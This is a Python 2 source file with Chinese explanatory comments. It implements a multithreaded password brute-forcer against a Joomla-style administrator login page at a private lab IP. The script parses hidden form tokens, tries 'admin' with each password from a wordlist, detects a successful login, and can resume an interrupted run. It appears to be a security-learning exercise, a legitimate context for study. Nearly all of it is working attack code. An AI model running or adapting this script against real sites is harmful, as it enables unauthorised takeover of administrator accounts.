# -*- coding: utf-8 -*-

import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

# 简要设置
user_thread = 10
username = "admin"
wordlist_file = "./cain.txt"
resume = None

# 特定目标设置
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"


'''
HTMLParser类主要提供三种方法：
1. handle_starttag(self, tag, attrs): 遇到一个HTML标签开启时使用
2. handle_endtag(self, tag): 遇到一个HTML标签闭合时使用
3. handle_data(self, data): 处理两个标签之间的原始文本

例如：
<title name='python' value='text'>Python rocks!</title>

handle_starttag => tag = "title", attrs=[('name','python'), ('value','text')]
handle_data     => data = "Python rocks!"
handle_endtag   => tag = "title"
'''


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):

        # 寻找input标签
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value



class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print "Finished setting up for: %s" % username

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            # 获取当前页面
            page = response.read()

            print "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())

            # 解析隐藏区域
            parser = BruteParser()
            # feed()函数将整个page中遇到的每个标签开始时，使用类中handle_starttag()函数
            parser.feed(page)

            # 返回的是一个字典，包含页面中fields
            post_tags = parser.tag_results

            # 替换用户名和密码为我们生成的用户名和密码
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)

            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True

                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."

def build_wordlist(wordlist_file):

    # 读入字典文件
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    for word in raw_words:
        word = word.rstrip()

        # 若因程序崩溃或网络中断导致程序中断，以下可以在之后恢复运行
        if resume is not None:

            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from %s" % resume
        else:
            words.put(word)

    return words

words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
